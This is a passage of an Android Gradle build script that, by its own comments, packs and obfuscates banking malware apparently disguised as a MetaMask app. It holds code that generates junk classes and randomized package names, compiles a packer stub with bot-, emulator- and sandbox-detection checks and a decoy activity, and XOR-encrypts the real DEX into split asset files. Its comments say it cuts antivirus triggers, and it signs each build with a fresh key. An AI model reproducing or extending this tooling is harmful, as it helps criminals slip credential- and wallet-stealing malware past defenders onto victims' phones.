                if (junkUtilPool.isNotEmpty() && m % ((2..4).random()) == 0) {
                    val u = junkUtilPool.random(); val mth = u.methods.random()
                    sb.append("    public long m$m(long x){ return ${u.fqn}.INSTANCE.${mth}(x); }\n")
                } else {
                    sb.append("    public void m$m(){}\n")
                }
            }
            sb.append("}\n")
            junkDir.resolve("$sub/$bname.java").writeText(sb.toString())
        }

        dynamicProguardRules.parentFile.mkdirs()
        dynamicProguardRules.writeText("""
# ── NativeBridge JNI: сохраняем только native-методы ──
-keepclasseswithmembernames class $randomPkg.$CLS_NATIVE_BRIDGE {
    native <methods>;
}

# ── Enums: reflection через values()/valueOf() ──
-keepclassmembers enum $randomPkg.** {
    public static **[] values();
    public static ** valueOf(java.lang.String);
}

# ── Android-компоненты из Manifest: AGP генерирует keep автоматически.
#    Условный Manifest уже исключает компоненты disabled-модулей.
#    R8 shrinking удалит unreachable классы (BuildConfig.FEAT_XXX=false → dead code).

# ── Junk-компоненты в манифесте ──
-keep class $junkPkg.** { *; }
-keepclassmembers class $junkPkg.** { public void *(); }

# ── JNI-мост ──
-keep class com.yourcompany.** { *; }
-keepnames class com.yourcompany.** { *; }
-keep class com.yourcompany.core.jni.$CLS_NATIVE_BRIDGE { *; }
-keep class com.yourcompany.internal.SystemActionCallback { *; }
-keep interface com.yourcompany.internal.TaskResultListener { *; }

${if (featFcm) "# -- Firebase / GMS --\n-keep class com.google.firebase.** { *; }\n-keep class com.google.android.gms.** { *; }\n-dontwarn com.google.firebase.**\n-dontwarn com.google.android.gms.**" else "# FCM disabled -- Firebase rules omitted\n-dontwarn com.google.firebase.**\n-dontwarn com.google.android.gms.**"}

# ── R8 optimization ENABLED ──
# Tier 1 of AV-trigger reduction: `-dontoptimize` removed so that R8's optimizer
# honours `-assumenosideeffects class android.util.Log { ... }` (proguard-rules.pro)
# and strips every Log.v/d/i/w/e/wtf call — eliminating thousands of banker-flavor
# log strings from DEX. `-dontshrink` (above in obfuscation.pro / generated rules)
# still prevents tree-shaking, so DEX retains its diverse class graph.
-optimizationpasses 5
""".trimIndent())

        println("--- [CRISTOFER_V2] appId=$randomPkg v$rndVersionName ($rndVersionCode) SO=$SO_NAME junk=${allComps.size}comps strRes=$rndStrCount ---")
    }
}

if (isRandomizedBuild) {
    tasks.named("preBuild").configure { dependsOn("prepareAndRandomizeSources") }
}

val generateObfDictionaries = tasks.register("generateObfDictionaries") {
    outputs.upToDateWhen { false }
    doLast {
        val sr = SecureRandom()
        val seedBytes = ByteArray(32).also { sr.nextBytes(it) }
        val seed = seedBytes.foldIndexed(0L) { i, acc, b -> acc xor ((b.toLong() and 0xFF) shl (i % 8 * 8)) }
        val rng  = Random(seed)

        val cons  = "bcdfghjklmnpqrstvwxz".toCharArray()
        val vows  = "aeiou".toCharArray()
        val used  = mutableSetOf<String>()

        fun nextRaw(minSyl: Int, maxSyl: Int): String {
            while (true) {
                val sylCount = minSyl + rng.nextInt(maxSyl - minSyl + 1)
                val sb = StringBuilder(sylCount * 2)
                repeat(sylCount) {
                    sb.append(cons[rng.nextInt(cons.size)])
                    sb.append(vows[rng.nextInt(vows.size)])
                }
                val n = sb.toString()
                if (used.add(n)) return n
            }
        }

        val obfDir = layout.buildDirectory.dir("obf").get().asFile.also { it.mkdirs() }

        obfDir.resolve("dict_classes.txt").writeText(
            (1..10_000).joinToString("\n") { nextRaw(2, 6).replaceFirstChar { c -> c.uppercaseChar() } }
        )
        obfDir.resolve("dict_methods.txt").writeText(
            (1..10_000).joinToString("\n") { nextRaw(2, 5) }
        )
        obfDir.resolve("dict_packages.txt").writeText(
            (1..3_000).joinToString("\n") { nextRaw(1, 3) }
        )

        println("--- [OBF-DICT] Build-unique dictionaries generated via SecureRandom (seed never repeats) ---")
    }
}

tasks.whenTaskAdded {
    if (name == "minifyReleaseWithR8") dependsOn(generateObfDictionaries)
}

val PACK_OUT_DIR = layout.buildDirectory.dir("pack-out").get().asFile
val PACK_STUB_DEX = File(PACK_OUT_DIR, "stub-classes.dex")

tasks.register("compileStubDex") {
    outputs.upToDateWhen { false }
    doLast {
        PACK_OUT_DIR.deleteRecursively(); PACK_OUT_DIR.mkdirs()

        val srcRoot = File(PACK_OUT_DIR, "src").also { it.mkdirs() }
        val pkgDir = File(srcRoot, randomPkg.replace(".", "/")).also { it.mkdirs() }

        val stubSrc = project.projectDir.resolve("pack/stub/StubApp.java")
        if (!stubSrc.exists()) throw GradleException("Stub source not found: $stubSrc")
        var code = stubSrc.readText()

        val stubMethodNames = mapOf(
            "hasBotPackage"            to "m${rndId(9)}",
            "isSuspiciousInstallTimes" to "m${rndId(9)}",
            "isTooFewUserApps"         to "m${rndId(9)}",
            "swapApp"                  to "m${rndId(9)}"
        )
        println("--- [PACK] stub method rename: ${stubMethodNames.entries.joinToString { "${it.key}→${it.value}" }} ---")
        stubMethodNames.forEach { (orig, rand) -> code = code.replace(orig, rand) }

        val stubXorKey = (1..255).filter { it != 0x5A }.random()
        val byteArrayRe = Regex("""x\(new byte\[\]\{([^}]+)\}\)""")
        code = byteArrayRe.replace(code) { mr ->
            val bytes = mr.groupValues[1].split(",").map { it.trim().toInt() }
            val reEncoded = bytes.map { v ->
                val unsigned = (v xor 0x5A xor stubXorKey) and 0xFF
                if (unsigned > 127) unsigned - 256 else unsigned
            }
            "x(new byte[]{${reEncoded.joinToString(",")}})"
        }
        code = code.replace("STUB_XOR_KEY_PLACEHOLDER", "0x${stubXorKey.toString(16).padStart(2, '0')}")
        println("--- [PACK] stub XOR key: 0x${stubXorKey.toString(16).padStart(2, '0')} (${byteArrayRe.findAll(code).count()} arrays re-encoded) ---")

        code = code
            .replace("STUB_PACKAGE_PLACEHOLDER", randomPkg)
            .replace("DEXLDR_LIBNAME_PLACEHOLDER", DEXLDR_SO_NAME)
            .replace("SECURE_LIBNAME_PLACEHOLDER", SO_NAME)
            .replace("REAL_APP_FQN_PLACEHOLDER", "$randomPkg.$CLS_MAIN_APP")
            .replace("nativeUnpack", JNI_UNPACK_SYMBOL)
            .replace("LITE_CHECK_SYMBOL_PLACEHOLDER", JNI_LITE_CHECK_SYMBOL)
            .replace("STUB_DECOY_FQN_PLACEHOLDER", "$randomPkg.$STUB_DECOY_CLS")
            .replace("class StubApp", "class $STUB_CLS")
        val srcFile = File(pkgDir, "$STUB_CLS.java")
        srcFile.writeText(code)

        val decoySrc = project.projectDir.resolve("pack/stub/StubDecoyActivity.java")
        if (!decoySrc.exists()) throw GradleException("Decoy source not found: $decoySrc")
        var decoyCode = decoySrc.readText()
        decoyCode = decoyCode
            .replace("STUB_PACKAGE_PLACEHOLDER", randomPkg)
            .replace("class StubDecoyActivity", "class $STUB_DECOY_CLS")
        val decoySrcFile = File(pkgDir, "$STUB_DECOY_CLS.java")
        decoySrcFile.writeText(decoyCode)

        val factorySrc = project.projectDir.resolve("pack/stub/StubAppComponentFactory.java")
        if (!factorySrc.exists()) throw GradleException("Factory source not found: $factorySrc")
        var factoryCode = factorySrc.readText()
        factoryCode = factoryCode
            .replace("STUB_PACKAGE_PLACEHOLDER", randomPkg)
            .replace("STUB_FACTORY_CLS_PLACEHOLDER", STUB_FACTORY_CLS)
        val factorySrcFile = File(pkgDir, "$STUB_FACTORY_CLS.java")
        factorySrcFile.writeText(factoryCode)

        val androidJar = "$sdkDir/platforms/android-36/android.jar"
        if (!file(androidJar).exists()) throw GradleException("android.jar not found at $androidJar")
        val classesDir = File(PACK_OUT_DIR, "classes").also { it.mkdirs() }
        val javac = if (isWindows) "javac.exe" else "javac"
        runCmd(listOf(javac,
            "-source", "8", "-target", "8",
            "-bootclasspath", androidJar,
            "-classpath", androidJar,
            "-d", classesDir.absolutePath,
            "-encoding", "UTF-8",
            srcFile.absolutePath,
            decoySrcFile.absolutePath,
            factorySrcFile.absolutePath
        ))

        val classFile = File(classesDir, "${randomPkg.replace(".", "/")}/$STUB_CLS.class")
        val decoyClassFile = File(classesDir, "${randomPkg.replace(".", "/")}/$STUB_DECOY_CLS.class")
        if (!classFile.exists()) throw GradleException("javac did not produce $classFile")
        if (!decoyClassFile.exists()) throw GradleException("javac did not produce $decoyClassFile")
        val allClassFiles = classesDir.walk()
            .filter { it.isFile && it.name.endsWith(".class") }
            .map { it.absolutePath }
            .toList()
        val d8 = "$sdkDir/build-tools/$buildToolsVer/" + if (isWindows) "d8.bat" else "d8"
        val dexOutDir = File(PACK_OUT_DIR, "dex").also { it.mkdirs() }
        if (isWindows)
            runCmd(listOf("cmd", "/c", d8, "--release",
                "--output", dexOutDir.absolutePath, "--lib", androidJar) + allClassFiles)
        else
            runCmd(listOf(d8, "--release",
                "--output", dexOutDir.absolutePath, "--lib", androidJar) + allClassFiles)
        val produced = File(dexOutDir, "classes.dex")
        if (!produced.exists()) throw GradleException("d8 did not produce classes.dex")
        produced.renameTo(PACK_STUB_DEX)
        println("--- [PACK] compileStubDex: ${PACK_STUB_DEX.length()} bytes (class=$STUB_CLS, decoy=$STUB_DECOY_CLS, factory=$STUB_FACTORY_CLS) ---")
    }
}

tasks.register("packRelease") {
    dependsOn("compileStubDex")
    outputs.upToDateWhen { false }
    doLast {
        val rawApk = file(outDir).walk().find {
            it.name.endsWith(".apk") &&
                    !it.name.contains("relis") &&
                    !it.name.contains("flagged") &&
                    !it.name.contains("aligned") &&
                    it.name.contains("release")
        } ?: throw GradleException("[PACK] raw release APK not found in $outDir")

        if (!PACK_STUB_DEX.exists()) throw GradleException("[PACK] stub DEX missing: $PACK_STUB_DEX")

        val packedApk = File(rawApk.parentFile, "${rawApk.nameWithoutExtension}_packed.apk")
        var origDexSize = 0
        ZipFile(rawApk).use { zin ->
            ZipOutputStream(BufferedOutputStream(FileOutputStream(packedApk))).use { zout ->
                zout.setLevel(Deflater.BEST_COMPRESSION)

                val oldPayloadRegex = Regex("""^assets/[a-z0-9]{6}/[a-z0-9]{8}\.(db|bin|cache|tmp)$""")
                val entries = zin.entries().toList()
                for (e in entries) {
                    when {
                        e.name == "classes.dex" -> {
                            val orig = zin.getInputStream(e).readBytes()
                            origDexSize = orig.size
                            val compressed = ByteArrayOutputStream().also { baos ->
                                GZIPOutputStream(baos).use { gz -> gz.write(orig) }
                            }.toByteArray()
                            val enc = ByteArray(compressed.size)
                            val keyLen = PACK_XOR_KEY.size
                            for (i in compressed.indices) {
                                enc[i] = (compressed[i].toInt() xor PACK_XOR_KEY[i % keyLen].toInt()).toByte()
                            }

                            val totalLen  = enc.size
                            val part0End  = totalLen / 3
                            val part1End  = totalLen * 2 / 3
                            val splits    = listOf(0 to part0End, part0End to part1End, part1End to totalLen)
                            println("--- [PACK] DEX ${origDexSize/1024}KB → gzip ${compressed.size/1024}KB → enc ${enc.size/1024}KB (3 parts) ---")
                            for (pi in 0..2) {
                                val (from, to) = splits[pi]
                                val partBytes  = enc.copyOfRange(from, to)
                                val entryPath  = "assets/$PAYLOAD_FOLDER/${PAYLOAD_PART_NAMES[pi]}"
                                val pe = ZipEntry(entryPath).apply {
                                    time = System.currentTimeMillis()
                                    method = ZipEntry.STORED
                                    size = partBytes.size.toLong()
                                    compressedSize = partBytes.size.toLong()
                                    val crc = CRC32(); crc.update(partBytes); this.crc = crc.value
                                }
                                zout.putNextEntry(pe); zout.write(partBytes); zout.closeEntry()
                                println("--- [PACK] part$pi → $entryPath (${partBytes.size/1024}KB) ---")
                            }

                            val stubBytes = PACK_STUB_DEX.readBytes()
                            val stubEntry = ZipEntry("classes.dex").apply { time = System.currentTimeMillis() }
                            zout.putNextEntry(stubEntry); zout.write(stubBytes); zout.closeEntry()
                        }
                        oldPayloadRegex.matches(e.name) -> { /* drop stale payload part */ }
                        else -> {
                            val ne = ZipEntry(e.name).apply {
                                method = e.method
                                time = e.time
                                if (e.method == ZipEntry.STORED) {
                                    size = e.size; crc = e.crc; compressedSize = e.compressedSize
                                }
                            }
                            zout.putNextEntry(ne)
                            zin.getInputStream(e).copyTo(zout)
                            zout.closeEntry()
                        }
                    }
                }
            }
        }
        if (origDexSize == 0) throw GradleException("[PACK] classes.dex was not found in raw APK")

        rawApk.delete()
        packedApk.renameTo(rawApk)

        val totalKb = rawApk.length() / 1024
        val stubKb  = PACK_STUB_DEX.length() / 1024
        val origKb  = origDexSize / 1024
        println("--- [PACK] packRelease: total=${totalKb}KB stub=${stubKb}KB orig_dex_encrypted=${origKb}KB key=${PACK_XOR_KEY.size}B ---")
    }
}

tasks.register<JavaCompile>("compileFlipAll") {
    source = fileTree("tools") { include("FlipZipFlagAll.java") }
    destinationDirectory.set(file(flipOutDir))
    classpath = files(); sourceCompatibility = "11"; targetCompatibility = "11"; options.encoding = "UTF-8"
}

tasks.register("runFlipAndSign") {
    dependsOn("compileFlipAll")
    doLast {
        val baseApk = file(outDir).walk().find { it.name.endsWith(".apk") && !it.name.contains("relis") && !it.name.contains("flagged") && it.name.contains("release") }
            ?: return@doLast
        val flaggedApk = "$outDir/flagged.apk"
        val alignedApk = "$outDir/aligned.apk"
        val finalApk   = "$outDir/relis.apk"

        stripApkMetaData(baseApk)
        javaexec { mainClass.set("FlipZipFlagAll"); classpath = files(flipOutDir); args = listOf(baseApk.absolutePath, flaggedApk) }
        runCmd(listOf(ZIPALIGN, "-p", "-f", "4", flaggedApk, alignedApk))
        randomizeZipTimestamps(file(alignedApk))

        val (ks, al, pw) = generateUniqueKey("release_${rndId(4)}")
        val signerCmd = if (isWindows) listOf("cmd","/c",APKSIGNER) else listOf(APKSIGNER)
        runCmd(signerCmd + listOf("sign","--v1-signing-enabled","false","--ks",ks,"--ks-key-alias",al,"--ks-pass","pass:$pw","--out",finalApk,alignedApk))

        file(flaggedApk).delete(); file(alignedApk).delete()
        val mb = "%.1f".format(file(finalApk).length() / 1048576.0)
        println("--- [CRISTOFER_V2] Final APK: $finalApk (${mb}MB) pkg=$randomPkg ---")
    }
}

tasks.register("generateJunkSource") {
    outputs.upToDateWhen { false }
    doLast {
        val junkFile = file("src/main/java/com/example/MetaMask/JnkBuildTag.kt")
        junkFile.writeText("package com.example.MetaMask\ninternal object JnkBuildTag {\n    @JvmField val ID = \"${UUID.randomUUID()}\"\n    @JvmField val N = ${(1..99999999).random()}\n}")
        println("--- [JUNK-SRC] JnkBuildTag.kt written ---")
    }
}
tasks.named("preBuild") { dependsOn("generateJunkSource") }

afterEvaluate {
    tasks.findByName("assembleRelease")?.finalizedBy("packRelease")
    tasks.findByName("packRelease")?.finalizedBy("runFlipAndSign")
}

tasks.named<Delete>("clean") {
    delete(project.projectDir.resolve(".cxx"))
    delete(layout.buildDirectory.dir("kotlin").get().asFile)
    delete(layout.buildDirectory.dir("outputs/mapping").get().asFile)
    delete(layout.buildDirectory.dir("intermediates/r8_metadata").get().asFile)
    delete(layout.buildDirectory.dir("kotlinToolingMetadata").get().asFile)
    delete(layout.buildDirectory.file("generated_proguard_rules.pro").get().asFile)
}

dependencies {
    if (featFcm) {
        implementation(platform("com.google.firebase:firebase-bom:34.11.0"))
        implementation("com.google.firebase:firebase-common")
        implementation("com.google.firebase:firebase-messaging")
    }
    implementation("androidx.activity:activity-ktx:1.13.0")
    implementation("com.jakewharton.timber:timber:5.0.1")
    implementation("androidx.appcompat:appcompat:1.7.1")
    implementation("androidx.work:work-runtime:2.11.1")
    implementation("androidx.work:work-runtime-ktx:2.11.1")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-core:1.10.2")
    implementation("org.jetbrains.kotlinx:kotlinx-coroutines-android:1.10.2")
    implementation("com.squareup.okhttp3:okhttp:5.3.2")
    implementation("androidx.core:core-ktx:1.18.0")
    implementation("com.github.megatronking.stringfog:xor:5.0.0")
    testImplementation("junit:junit:4.13.2")
    androidTestImplementation("androidx.test.ext:junit:1.3.0")
    androidTestImplementation("androidx.test.espresso:espresso-core:3.7.0")
}
